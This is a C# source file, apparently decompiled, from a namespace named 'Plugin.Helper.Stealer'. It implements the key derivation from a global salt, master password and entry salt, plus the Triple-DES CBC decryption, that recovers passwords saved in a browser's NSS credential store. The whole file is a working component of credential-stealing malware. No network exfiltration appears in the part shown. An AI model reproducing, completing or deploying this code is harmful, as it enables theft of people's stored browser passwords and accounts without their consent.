

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;


namespace Plugin.Helper.Stealer
{
	public static class TripleDES
	{
		private static SHA1CryptoServiceProvider sha1 = new SHA1CryptoServiceProvider();

		public static TripleDES.KeyVector GetKeyVector(
			byte[] globalSalt,
			byte[] masterPassword,
			byte[] entrySalt)
		{
			if (entrySalt.Length > 20)
				return new TripleDES.KeyVector((byte[]) null, (byte[]) null, false);
			if (masterPassword == null)
				masterPassword = new byte[0];
			byte[] numArray1 = new byte[globalSalt.Length + masterPassword.Length];
			Array.Copy((Array) globalSalt, 0, (Array) numArray1, 0, globalSalt.Length);
			Array.Copy((Array) masterPassword, 0, (Array) numArray1, globalSalt.Length, masterPassword.Length);
			byte[] hash1 = TripleDES.sha1.ComputeHash(numArray1);
			byte[] numArray2 = new byte[hash1.Length + entrySalt.Length];
			Array.Copy((Array) hash1, 0, (Array) numArray2, 0, hash1.Length);
			Array.Copy((Array) entrySalt, 0, (Array) numArray2, hash1.Length, entrySalt.Length);
			byte[] hash2 = TripleDES.sha1.ComputeHash(numArray2);
			byte[] numArray3 = new byte[20];
			Array.Copy((Array) entrySalt, 0, (Array) numArray3, 0, entrySalt.Length);
			byte[] numArray4 = new byte[numArray3.Length + entrySalt.Length];
			Array.Copy((Array) numArray3, 0, (Array) numArray4, 0, numArray3.Length);
			Array.Copy((Array) entrySalt, 0, (Array) numArray4, numArray3.Length, entrySalt.Length);
			byte[] hash3;
			byte[] hash4;
			using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
			{
				hash3 = hmacshA1.ComputeHash(numArray4);
				byte[] hash5 = hmacshA1.ComputeHash(numArray3);
				byte[] numArray5 = new byte[hash5.Length + entrySalt.Length];
				Array.Copy((Array) hash5, 0, (Array) numArray5, 0, hash5.Length);
				Array.Copy((Array) entrySalt, 0, (Array) numArray5, hash5.Length, entrySalt.Length);
				hash4 = hmacshA1.ComputeHash(numArray5);
			}
			byte[] numArray6 = new byte[hash3.Length + hash4.Length];
			Array.Copy((Array) hash3, 0, (Array) numArray6, 0, hash3.Length);
			Array.Copy((Array) hash4, 0, (Array) numArray6, hash3.Length, hash4.Length);
			byte[] numArray7 = new byte[24];
			if (numArray7.Length > numArray6.Length)
				return new TripleDES.KeyVector((byte[]) null, (byte[]) null, false);
			Array.Copy((Array) numArray6, (Array) numArray7, numArray7.Length);
			byte[] numArray8 = new byte[8];
			Array.Copy((Array) numArray6, numArray6.Length - numArray8.Length, (Array) numArray8, 0, numArray8.Length);
			return new TripleDES.KeyVector(numArray7, numArray8, true);
		}

		public static byte[] DecryptByteDesCbc(
			byte[] globalSalt,
			byte[] masterPassword,
			byte[] entrySalt,
			byte[] cipherText)
		{
			TripleDES.KeyVector keyVector = TripleDES.GetKeyVector(globalSalt, masterPassword, entrySalt);
			return !keyVector.valid ? (byte[]) null : TripleDES.DecryptByteDesCbc(keyVector.key, keyVector.vector, cipherText);
		}

		public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
		{
			return Encoding.UTF8.GetString(TripleDES.DecryptByteDesCbc(key, iv, input));
		}

		public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
		{
			byte[] buffer = new byte[512];
			using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				cryptoServiceProvider.Key = key;
				cryptoServiceProvider.IV = iv;
				cryptoServiceProvider.Mode = CipherMode.CBC;
				cryptoServiceProvider.Padding = PaddingMode.None;
				ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
						cryptoStream.Read(buffer, 0, buffer.Length);
				}
			}
			return buffer;
		}

		public struct KeyVector
		{
			public bool valid;
			public byte[] key;
			public byte[] vector;

			public KeyVector(byte[] _key, byte[] _vector, bool _valid)
			{
				this.key = _key;
				this.vector = _vector;
				this.valid = _valid;
			}
		}
	}
}
